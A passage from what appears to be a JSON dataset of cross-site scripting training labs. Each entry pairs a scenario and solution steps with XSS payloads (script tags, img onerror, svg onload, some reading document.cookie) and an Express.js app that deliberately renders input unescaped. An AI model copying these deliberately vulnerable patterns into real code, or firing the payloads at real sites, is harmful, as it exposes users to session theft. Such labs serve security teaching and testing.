      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let feedback = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/feedback', (req, res) => { res.send('<form method=\"POST\"><input name=\"subject\"><textarea name=\"message\"></textarea><button>Send</button></form>'); }); app.post('/feedback', (req, res) => { feedback.push(req.body.subject); res.redirect('/staff/emails'); }); app.get('/staff/emails', (req, res) => { const subjects = feedback.map(s => `<div>${s}</div>`).join(''); res.send(`<html><body>${subjects}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Profile Tagline in Social Networking Site",
      "Lab Description": "A social networking platform lets users write a short 'tagline' that appears below their username. The tagline is stored and rendered without escaping, making it possible to inject JavaScript. To solve: Inject a payload in the tagline field and visit the user profile page to confirm execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to your profile edit page.",
        "Update the tagline with an XSS payload.",
        "Visit your public profile page.",
        "Inspect how the tagline is injected into the page.",
        "Confirm XSS execution in the rendered profile."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let tagline = ''; app.use(bodyParser.urlencoded({ extended: true })); app.get('/edit-profile', (req, res) => { res.send('<form method=\"POST\"><input name=\"tagline\"><button>Save</button></form>'); }); app.post('/edit-profile', (req, res) => { tagline = req.body.tagline; res.redirect('/profile'); }); app.get('/profile', (req, res) => { res.send(`<html><body><h1>User</h1><p>${tagline}</p></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Booking Notes on Travel Confirmation Page",
      "Lab Description": "A travel booking app allows users to leave optional notes for hotel staff. These notes appear unfiltered in the booking confirmation page after checkout. The system fails to sanitize HTML or JavaScript in this field. To solve: Inject a payload as the note, complete the booking, and confirm script execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Book a room and leave an XSS payload in the 'special requests' field.",
        "Complete the reservation process.",
        "View the booking confirmation page.",
        "Inspect the location of the note reflection.",
        "Trigger and verify the XSS payload."
      ],
      "payloads": [
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>",
        "<script>alert(document.domain)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let notes = ''; app.use(bodyParser.urlencoded({ extended: true })); app.get('/book', (req, res) => { res.send('<form method=\"POST\" action=\"/confirm\"><input name=\"note\"><button>Book</button></form>'); }); app.post('/confirm', (req, res) => { notes = req.body.note; res.redirect('/confirmation'); }); app.get('/confirmation', (req, res) => { res.send(`<html><body><h2>Booking Confirmed</h2><div>${notes}</div></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Internal Chat Mentions Feature",
      "Lab Description": "An internal messaging system auto-links @mentions in chat messages. However, it processes message content using a replace function without escaping dangerous characters, allowing injection of script tags. To solve: Send a chat message containing an XSS payload that gets executed in the chat history.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Open the internal chat panel.",
        "Send a message containing a crafted @mention XSS payload.",
        "Observe how the message gets rendered with improper escaping.",
        "Trigger XSS via auto-linking logic.",
        "Verify payload execution in chat history."
      ],
      "payloads": [
        "@<script>alert(1)</script>",
        "@<img src=x onerror=alert(1)>",
        "@<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/chat', (req, res) => { const chat = messages.map(m => m.replace(/@(\\w+)/g, '<a href=\"/user/$1\">@$1</a>')).join('<br>'); res.send(`<html><body>${chat}<form method=\"POST\"><input name=\"msg\"><button>Send</button></form></body></html>`); }); app.post('/chat', (req, res) => { messages.push(req.body.msg); res.redirect('/chat'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Address Field in Delivery Tracking App",
      "Lab Description": "A delivery tracking platform displays user-supplied addresses on a tracking page. The address input is not encoded before being inserted into a div container, allowing attackers to inject HTML or JavaScript. To solve: Inject a payload into the address field and trigger it via the tracking page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a delivery request with a malicious address value.",
        "Visit the tracking page for that delivery.",
        "Inspect how the address appears in the DOM.",
        "Inject and test a payload that triggers XSS.",
        "Verify successful execution of the script."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(document.domain)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let address = ''; app.use(bodyParser.urlencoded({ extended: true })); app.get('/new-delivery', (req, res) => { res.send('<form method=\"POST\"><input name=\"address\"><button>Track</button></form>'); }); app.post('/track', (req, res) => { address = req.body.address; res.redirect('/tracking'); }); app.get('/tracking', (req, res) => { res.send(`<html><body><h1>Tracking Info</h1><div>${address}</div></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Task Name Field of Project Management Dashboard",
      "Lab Description": "A project management tool allows users to add tasks, and the task name is rendered directly in the dashboard without output encoding. The dashboard uses a JavaScript templating engine that does not sanitize content. To solve: Inject a script into the task name and confirm execution in the rendered dashboard view.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the task creation page.",
        "Create a new task with an XSS payload in the task name.",
        "View the dashboard where the task list is rendered.",
        "Confirm the task name appears with injected content.",
        "Verify that the payload executes in the context of the dashboard."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let tasks = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/add-task', (req, res) => { res.send('<form method=\"POST\"><input name=\"task\"><button>Add</button></form>'); }); app.post('/add-task', (req, res) => { tasks.push(req.body.task); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { const html = tasks.map(t => `<li>${t}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in 'Company Bio' Field of Job Posting Portal",
      "Lab Description": "A job portal allows companies to publish job listings with a 'company bio' field that is reflected unescaped in the job description page. This bio is stored as-is and injected directly into the HTML body. To solve: Craft a malicious bio, view the job post page, and confirm payload execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to the job posting form.",
        "Submit a job with a crafted XSS payload in the company bio field.",
        "Visit the job details page.",
        "Confirm that the payload appears in the DOM without sanitization.",
        "Trigger and verify JavaScript execution."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(document.domain)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let jobs = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/post-job', (req, res) => { res.send('<form method=\"POST\"><input name=\"bio\"><button>Post</button></form>'); }); app.post('/post-job', (req, res) => { jobs.push(req.body.bio); res.redirect('/jobs'); }); app.get('/jobs', (req, res) => { const jobHtml = jobs.map(j => `<div>${j}</div>`).join(''); res.send(`<html><body>${jobHtml}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Comment Field on Online Course Reviews",
      "Lab Description": "An educational platform allows users to leave reviews. The comment content is rendered directly without sanitization on the course page. This results in stored XSS if malicious input is submitted. To solve: Submit a malicious comment and view it on the course detail page to confirm execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Visit a course and leave a comment with a script payload.",
        "Submit the form and return to the course detail view.",
        "Inspect how the comment is reflected in the HTML.",
        "Confirm the injection point and trigger XSS.",
        "Validate script execution in the user session."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(document.domain)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let comments = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/course', (req, res) => { const content = comments.map(c => `<p>${c}</p>`).join(''); res.send(`<html><body>${content}<form method=\"POST\"><input name=\"comment\"><button>Comment</button></form></body></html>`); }); app.post('/course', (req, res) => { comments.push(req.body.comment); res.redirect('/course'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Newsletter Preview Feature Using User Bio",
      "Lab Description": "A newsletter creation tool allows insertion of dynamic user bios into the newsletter preview. The bio is fetched and embedded without encoding, leading to XSS if a user injects malicious content. To solve: Modify your bio with a payload and generate a preview that triggers the XSS.",
      "Difficulty Level": "High",
      "Solution Steps": [
        "Edit your user profile to include a script in the bio.",
        "Navigate to the newsletter builder and create a new campaign.",
        "Enable dynamic content preview and insert the user bio tag.",
        "Generate a preview and inspect how the bio is rendered.",
        "Verify XSS payload execution in the preview pane."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(document.domain)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let bio = ''; app.use(bodyParser.urlencoded({ extended: true })); app.get('/edit-bio', (req, res) => { res.send('<form method=\"POST\"><textarea name=\"bio\"></textarea><button>Save</button></form>'); }); app.post('/edit-bio', (req, res) => { bio = req.body.bio; res.redirect('/preview'); }); app.get('/preview', (req, res) => { res.send(`<html><body><h2>Preview</h2><div>${bio}</div></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Search Query Parameter on Product Listing Page",
      "Lab Description": "An e-commerce website reflects the search query parameter in the product listing title. The query is injected without proper sanitization inside a heading tag. To solve: Inject a payload through the search box and confirm its execution when the search results page is rendered.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to the product search page.",
        "Submit a search query containing an XSS payload.",
        "Observe how the input is reflected in the results title.",
        "Trigger and confirm execution of the script.",
        "Verify that it runs within the same context as the application."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "\"><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/search', (req, res) => { const q = req.query.q || ''; res.send(`<html><body><h1>Results for: ${q}</h1></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in 'Name' Field of Event Registration Confirmation Page",
      "Lab Description": "An event management system takes the user's name from the registration form and reflects it directly in the confirmation message. The message is built using string concatenation in the HTML response without encoding. To solve: Inject a payload through the name field and confirm script execution on the confirmation page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to the event registration form.",
        "Submit the form with a malicious script in the 'name' field.",
        "Observe how the name is reflected in the confirmation message.",
        "Confirm that the payload executes upon page load.",
        "Verify that JavaScript context is achieved."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(document.domain)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/register', (req, res) => { res.send('<form method=\"POST\"><input name=\"name\"><button>Register</button></form>'); }); app.post('/register', (req, res) => { const name = req.body.name; res.send(`<html><body>Thank you, ${name}, for registering!</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in 'Location' Field on Public Event Listings",
      "Lab Description": "A community site lists public events and includes the location submitted by the event organizer. The location is rendered without HTML encoding in a map tooltip. To solve: Inject a script into the location field and confirm its execution in the tooltip.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create a new event with a malicious location payload.",
        "View the event listing with the embedded map.",
        "Hover over the map marker to trigger the tooltip.",
        "Check how the location appears in the DOM.",
        "Confirm that the payload executes in the tooltip context."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<script>alert(document.domain)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let events = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/add-event', (req, res) => { res.send('<form method=\"POST\"><input name=\"location\"><button>Add</button></form>'); }); app.post('/add-event', (req, res) => { events.push(req.body.location); res.redirect('/events'); }); app.get('/events', (req, res) => { const html = events.map(loc => `<div title=\"${loc}\">Event</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Embedded Message in Internal Messaging System",
      "Lab Description": "An internal messaging tool allows users to send HTML messages. These are rendered as-is without sanitization, allowing stored XSS. To solve: Send a crafted message to another user, then view the inbox to confirm execution.",
      "Difficulty Level": "High",
      "Solution Steps": [
        "Log in and navigate to the message composer.",
        "Send a message containing a script tag.",
        "Log in as the receiving user.",
        "Open the inbox and view the crafted message.",
        "Confirm execution of the script."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(document.domain)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/compose', (req, res) => { res.send('<form method=\"POST\"><textarea name=\"msg\"></textarea><button>Send</button></form>'); }); app.post('/compose', (req, res) => { messages.push(req.body.msg); res.redirect('/inbox'); }); app.get('/inbox', (req, res) => { const html = messages.map(m => `<div>${m}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Feedback Widget on Documentation Portal",
      "Lab Description": "A feedback widget on a documentation portal takes user input and displays it immediately for confirmation without any encoding. The feedback preview reflects unescaped HTML. To solve: Submit a script in the feedback and confirm it executes on the preview page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Open a page with the feedback widget.",
        "Enter a script payload in the feedback form.",
        "Click submit to preview the message.",
        "Inspect how the preview is rendered.",
        "Confirm payload execution in the preview frame."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(document.cookie)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/feedback', (req, res) => { res.send('<form method=\"POST\"><textarea name=\"msg\"></textarea><button>Submit</button></form>'); }); app.post('/feedback', (req, res) => { const msg = req.body.msg; res.send(`<html><body><h3>Preview</h3><div>${msg}</div></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in 'Favorite Quote' Section of User Profile",
      "Lab Description": "A social platform allows users to save and display a favorite quote in their profile. The quote is stored and rendered without escaping, resulting in stored XSS. To solve: Set a quote with a script tag, visit your profile, and observe payload execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to your profile settings.",
        "Set a favorite quote with an XSS payload.",
        "Visit your public profile page.",
        "Inspect how the quote is displayed.",
        "Confirm that the script executes in the browser."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<svg/onload=alert(document.domain)>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let quote = ''; app.use(bodyParser.urlencoded({ extended: true })); app.get('/edit-profile', (req, res) => { res.send('<form method=\"POST\"><input name=\"quote\"><button>Save</button></form>'); }); app.post('/edit-profile', (req, res) => { quote = req.body.quote; res.redirect('/profile'); }); app.get('/profile', (req, res) => { res.send(`<html><body><h1>Favorite Quote</h1><p>${quote}</p></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via 'Company' Field on Job Posting Portal",
      "Lab Description": "A job posting form allows employers to specify a company name that is displayed on job listings. The company name is rendered using raw HTML with no sanitization. To solve: Inject a script in the company name and confirm it executes on the listing page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Open the job posting page and fill the form with a script in the company field.",
        "Submit the job and navigate to the public listing.",
        "Check how the company name appears in the listing.",
        "Observe if the payload is rendered as executable code.",
        "Verify alert or DOM modification triggered."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(document.cookie)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let jobs = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/post-job', (req, res) => { res.send('<form method=\"POST\"><input name=\"company\"><button>Post</button></form>'); }); app.post('/post-job', (req, res) => { jobs.push(req.body.company); res.redirect('/jobs'); }); app.get('/jobs', (req, res) => { const html = jobs.map(c => `<div>Posted by ${c}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Product Review Section of E-commerce Platform",
      "Lab Description": "A review form on an e-commerce product page allows users to leave feedback that is displayed publicly. The review content is rendered as HTML without escaping. To solve: Submit a review containing a script payload and observe its execution on the product page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Visit any product page and locate the review form.",
        "Post a review with an embedded script payload.",
        "Refresh the product page and scroll to the review section.",
        "Observe how the review content is rendered.",
        "Confirm execution of JavaScript in the browser."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(document.domain)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let reviews = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/product', (req, res) => { res.send(`<form method=\"POST\"><textarea name=\"review\"></textarea><button>Submit</button></form>${reviews.map(r => `<div>${r}</div>`).join('')}`); }); app.post('/product', (req, res) => { reviews.push(req.body.review); res.redirect('/product'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "DOM XSS via Hash Fragment Injection in Help Page",
      "Lab Description": "A single-page help center loads content dynamically based on the URL hash and injects it into the page using `innerHTML`. This allows attackers to inject scripts by manipulating the hash. To solve: Craft a URL with a malicious hash and confirm script execution.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Open the help page and observe how content loads using the hash.",
        "Modify the URL hash with a script payload.",
        "Observe the dynamic injection of the content using JavaScript.",
        "Check how the DOM is updated based on the hash value.",
        "Confirm the script executes on page load or hash change."
      ],
      "payloads": [
        "#<img src=x onerror=alert(1)>",
        "#<svg/onload=alert('XSS')>",
        "#<script>alert(document.domain)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/', (req, res) => { res.send(`<html><body><div id=\"content\"></div><script>document.getElementById('content').innerHTML = location.hash.slice(1);</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in URL Parameter Reflected in Error Message",
      "Lab Description": "An application displays error messages using a URL parameter for user input. The input is reflected in the message directly without escaping. To solve: Inject a payload in the query parameter and trigger the error message to confirm execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the error page using a malformed input URL.",
        "Inject a payload into the vulnerable query parameter.",
        "Observe how the parameter is reflected in the response.",
        "Inspect if the output is directly inserted into the DOM.",
        "Confirm script execution by triggering a visible alert."
      ],
      "payloads": [
        "?error=<script>alert('XSS')</script>",
        "?error=<img src=x onerror=alert(1)>",
        "?error=<svg/onload=alert(document.domain)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/error', (req, res) => { const err = req.query.error || 'Unknown Error'; res.send(`<html><body><h2>Error: ${err}</h2></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Notes Feature of Task Manager App",
      "Lab Description": "Users can add custom notes to their tasks. The notes are stored and rendered without HTML sanitization. This allows stored XSS. To solve: Save a malicious script in the note, reload the tasks page, and confirm execution.",
      "Difficulty Level": "High",
      "Solution Steps": [
        "Create a new task and include a script in the note field.",
        "Save the task and reload the task list.",
        "Observe how the note content is rendered on the page.",
        "Check for script execution in the note display.",
        "Verify successful XSS execution by observing the alert or DOM modification."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(document.cookie)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let notes = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/tasks', (req, res) => { const list = notes.map(n => `<li>${n}</li>`).join(''); res.send(`<html><body><ul>${list}</ul><form method=\"POST\"><input name=\"note\"><button>Add Note</button></form></body></html>`); }); app.post('/tasks', (req, res) => { notes.push(req.body.note); res.redirect('/tasks'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "CMS Plugin Store XSS in Plugin Preview Renderer",
      "Lab Description": "The CMS provides a plugin marketplace where users can preview plugin UI before installation. The preview renders server-fetched plugin metadata including the 'description' field directly into the DOM using innerHTML. No sanitization is applied, allowing attackers to inject scripts via a crafted plugin.json file. To solve: Upload a malicious plugin and trigger preview rendering to execute JavaScript.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create a plugin.json file with a malicious description field.",
        "Upload it to the CMS plugin store endpoint.",
        "Navigate to the plugin preview screen.",
        "Observe unsafe rendering of plugin metadata.",
        "Trigger XSS payload in plugin description."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<script>alert(document.domain)</script>",
        "<svg/onload=confirm('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const fileUpload = require('express-fileupload'); const app = express(); app.use(fileUpload()); app.use(express.static('uploads')); const fs = require('fs'); app.post('/upload-plugin', (req, res) => { const file = req.files.plugin; file.mv('./uploads/' + file.name, () => { res.redirect('/preview?plugin=' + file.name); }); }); app.get('/preview', (req, res) => { const pluginPath = './uploads/' + req.query.plugin; const plugin = JSON.parse(fs.readFileSync(pluginPath)); res.send(`<html><body><div id='desc'></div><script>document.getElementById('desc').innerHTML = '${plugin.description}';</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Event Management Panel XSS in Attendee Name",
      "Lab Description": "An event admin panel allows CSV import of attendee data, which includes names and contact details. The imported names are rendered using innerHTML inside a table. No validation is applied during parsing, permitting injection through the 'name' field. To solve: Craft a malicious CSV and upload it to trigger script execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a CSV file with attendee name containing an XSS payload.",
        "Import the file through the admin upload portal.",
        "Review the attendee list rendered in a table.",
        "Confirm unsafe rendering of the name field.",
        "Trigger script execution via XSS."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const multer = require('multer'); const fs = require('fs'); const csv = require('csv-parser'); const app = express(); const upload = multer({ dest: 'uploads/' }); app.post('/upload-attendees', upload.single('file'), (req, res) => { const results = []; fs.createReadStream(req.file.path).pipe(csv()).on('data', (data) => results.push(data)).on('end', () => { let rows = results.map(a => `<tr><td>${a.name}</td><td>${a.email}</td></tr>`).join(''); res.send(`<html><body><table>${rows}</table></body></html>`); }); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Chatbot Integration XSS via User Alias",
      "Lab Description": "A helpdesk chatbot uses user-defined aliases to personalize responses. These aliases are stored in local storage and rendered in the chat window using innerHTML. The alias input is not sanitized, enabling XSS through alias injection. To solve: Inject a payload into the alias field and trigger it by sending a message.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set a malicious alias using the user settings panel.",
        "Trigger the chatbot to use the alias in a reply.",
        "Observe the alias being rendered unsafely.",
        "Confirm JavaScript execution through alias XSS."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<script>alert('XSS')</script>",
        "<svg/onload=alert('Bot')>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); let alias = 'User'; app.post('/set-alias', (req, res) => { alias = req.body.alias; res.redirect('/chat'); }); app.get('/chat', (req, res) => { res.send(`<html><body><div id='chatbox'></div><script>document.getElementById('chatbox').innerHTML = 'Hello, ${alias}!';</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Online Resume Builder via Experience Field",
      "Lab Description": "The application provides a live preview of resumes, rendering JSON input fields like 'experience' into a preview section. The server returns these fields directly, and the frontend uses dangerouslySetInnerHTML to render them. The 'experience' field allows injected markup. To solve: Inject JavaScript via this field and observe execution on preview.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create a resume entry with malicious input in the experience field.",
        "Access the preview panel for the resume.",
        "Observe that the experience field is rendered unsafely.",
        "Trigger XSS and verify execution."
      ],
      "payloads": [
        "<script>alert('Resume')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const resumes = {}; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit', (req, res) => { resumes[req.body.id] = req.body.experience; res.redirect('/preview?id=' + req.body.id); }); app.get('/preview', (req, res) => { const experience = resumes[req.query.id] || ''; res.send(`<html><body><div id='exp'></div><script>document.getElementById('exp').innerHTML = '${experience}';</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Knowledge Base Editor XSS in Markdown Preview",
      "Lab Description": "The internal knowledge base editor supports Markdown preview, rendering raw HTML if included in markdown. The editor does not sanitize input before rendering preview, allowing embedded scripts. To solve: Craft malicious markdown and trigger preview to confirm script execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the editor page and write markdown with embedded HTML/JS.",
        "Click 'Preview' to render it in the DOM.",
        "Observe that script tags are executed.",
        "Confirm successful XSS in preview component."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); app.get('/editor', (req, res) => { res.send(`<html><body><form method='POST' action='/preview'><textarea name='markdown'></textarea><button type='submit'>Preview</button></form></body></html>`); }); app.post('/preview', (req, res) => { res.send(`<html><body><div id='preview'>${req.body.markdown}</div></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Student Portal XSS in Course Feedback Field",
      "Lab Description": "A university portal allows students to submit course feedback, which is displayed to professors via a dashboard. The feedback content is inserted directly into a DOM container using innerHTML without sanitization. To solve: Inject a payload through the feedback field and trigger execution when a professor views it.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit feedback with a crafted XSS payload.",
        "Access the professor's dashboard interface.",
        "Observe rendering of feedback without escaping.",
        "Trigger XSS via the feedback field.",
        "Confirm successful execution."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<script>alert('Prof')</script>",
        "<svg/onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const feedbacks = []; app.use(express.urlencoded({ extended: true })); app.post('/submit-feedback', (req, res) => { feedbacks.push(req.body.feedback); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { const list = feedbacks.map(f => `<li>${f}</li>`).join(''); res.send(`<html><body><ul>${list}</ul></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Project Management Tool XSS via Project Title",
      "Lab Description": "In a collaborative project tool, users can name projects and view them in a list. Project titles are rendered with innerHTML directly into the interface. Input is not sanitized, leading to potential DOM XSS. To solve: Create a project with a malicious title and view it on the dashboard.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Create a new project with an XSS payload in the title.",
        "Navigate to the project listing page.",
        "Confirm that the payload is rendered unsafely.",
        "Trigger and verify JavaScript execution."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=confirm('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const projects = []; app.use(express.urlencoded({ extended: true })); app.post('/add-project', (req, res) => { projects.push(req.body.title); res.redirect('/projects'); }); app.get('/projects', (req, res) => { const list = projects.map(p => `<div>${p}</div>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "File Tracker XSS via Filename Display",
      "Lab Description": "A file management tool displays recently uploaded filenames using dangerouslySetInnerHTML in a React component. The backend does not sanitize filenames, and attackers can upload files with embedded scripts. To solve: Upload a file with a malicious name and view it in the recent uploads panel.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Upload a file with a malicious script embedded in the filename.",
        "Navigate to the recent uploads page.",
        "Observe unsafe rendering using dangerouslySetInnerHTML.",
        "Trigger the XSS payload from filename.",
        "Confirm execution."
      ],
      "payloads": [
